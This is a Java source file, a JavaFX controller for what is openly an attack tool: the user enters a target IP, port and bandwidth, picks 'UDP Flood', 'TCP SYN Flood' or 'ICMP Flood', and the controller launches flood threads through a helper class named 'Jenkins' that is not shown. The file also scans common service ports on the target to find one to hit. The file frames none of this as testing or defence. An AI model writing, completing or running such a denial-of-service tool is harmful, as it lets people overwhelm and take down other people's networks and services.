package com.yourpackage;

import javafx.fxml.FXML;
import javafx.scene.control.TextField;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.ComboBox;
import javafx.collections.FXCollections;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.Socket;
import javafx.scene.control.TextArea;
import javafx.application.Platform;
import java.net.InetSocketAddress;
import java.io.IOException;

public class MainController {
    private Jenkins jenkinsTool;

    @FXML private TextField ipAddressField;
    @FXML private TextField portField;
    @FXML private TextField mbpsField;
    @FXML private TextField macAddressField;
    @FXML private ComboBox<String> attackTypeComboBox;
    @FXML private Button startButton;
    @FXML private Button stopButton;
    @FXML private Button pingButton;
    @FXML private Button getMacButton;
    @FXML private Label statusLabel;
    @FXML private TextArea logArea;
    @FXML private Button findOpenPortButton;

    @FXML
    public void initialize() {
        jenkinsTool = new Jenkins();
        jenkinsTool.setLogArea(logArea);
        
        attackTypeComboBox.setItems(FXCollections.observableArrayList("UDP Flood", "TCP SYN Flood", "ICMP Flood"));
        
        startButton.setOnAction(e -> startAttack());
        stopButton.setOnAction(e -> stopAttack());
    }

    @FXML
    public void pingTargetIP() {
        try {
            String ip = ipAddressField.getText();
            InetAddress address = InetAddress.getByName(ip);
            log("Pinging " + ip + "...");
            boolean reachable = address.isReachable(5000);
            String result = reachable ? "Ping successful" : "Ping failed";
            log(result);
            statusLabel.setText(result);
        } catch (Exception e) {
            log("Error: " + e.getMessage());
            statusLabel.setText("Error: " + e.getMessage());
        }
    }

    @FXML
    public void getMacAddress() {
        String ipAddress = ipAddressField.getText();
        try {
            InetAddress addr = InetAddress.getByName(ipAddress);
            NetworkInterface ni = NetworkInterface.getByInetAddress(addr);
            if (ni != null) {
                byte[] mac = ni.getHardwareAddress();
                if (mac != null) {
                    StringBuilder sb = new StringBuilder();
                    for (int i = 0; i < mac.length; i++) {
                        sb.append(String.format("%02X%s", mac[i], (i < mac.length - 1) ? "-" : ""));
                    }
                    macAddressField.setText(sb.toString());
                    log("MAC address for " + ipAddress + ": " + sb.toString());
                } else {
                    log("Unable to retrieve MAC address for " + ipAddress);
                }
            } else {
                log("Network interface not found for " + ipAddress);
            }
        } catch (Exception e) {
            log("Error getting MAC address: " + e.getMessage());
        }
    }

    public void startAttack() {
        String attackType = attackTypeComboBox.getValue();
        String targetIp = ipAddressField.getText();
        int mbps = Integer.parseInt(mbpsField.getText());
        int bytesPerSecond = mbps * 125000; // Convert Mbps to bytes per second

        statusLabel.setText("Status: Attack in Progress");
        statusLabel.setStyle("-fx-text-fill: #2e7d32;");

        if ("UDP Flood".equals(attackType)) {
            log("Starting UDP flood attack...");
            int targetPort = Integer.parseInt(portField.getText());
            new Thread(() -> jenkinsTool.udpFlood(targetIp, targetPort, bytesPerSecond)).start();
        } else if ("TCP SYN Flood".equals(attackType)) {
            int targetPort = Integer.parseInt(portField.getText());
            log("Starting TCP SYN flood attack...");
            new Thread(() -> jenkinsTool.tcpSynFlood(targetIp, targetPort, bytesPerSecond)).start();
        } else if ("ICMP Flood".equals(attackType)) {
            log("Starting ICMP flood attack...");
            new Thread(() -> jenkinsTool.icmpFlood(targetIp, bytesPerSecond)).start();
        }
    }

    public void stopAttack() {
        jenkinsTool.stopAttack();
        log("Attack stopped");
        statusLabel.setText("Status: Idle");
        statusLabel.setStyle("-fx-text-fill: #c62828;");
    }

    @FXML
    public void findOpenPort() {
        String ip = ipAddressField.getText();
        log("Searching for open ports on " + ip);
        int[] commonPorts = {80, 443, 22, 21, 25, 3306, 8080, 1433, 3389, 5432};
        for (int port : commonPorts) {
            try (Socket socket = new Socket()) {
                socket.connect(new InetSocketAddress(ip, port), 100);
                portField.setText(String.valueOf(port));
                String message = "Open port found: " + port;
                log(message);
                statusLabel.setText(message);
                return;
            } catch (IOException e) {
                // Port is not open, continue to next
            }
        }
        String message = "No open ports found";
        log(message);
        statusLabel.setText(message);
    }

    private void log(String message) {
        String timestamp = java.time.LocalDateTime.now().format(java.time.format.DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss"));
        Platform.runLater(() -> {
            logArea.appendText(timestamp + " - " + message + "\n");
            logArea.setScrollTop(Double.MAX_VALUE);
        });
    }
}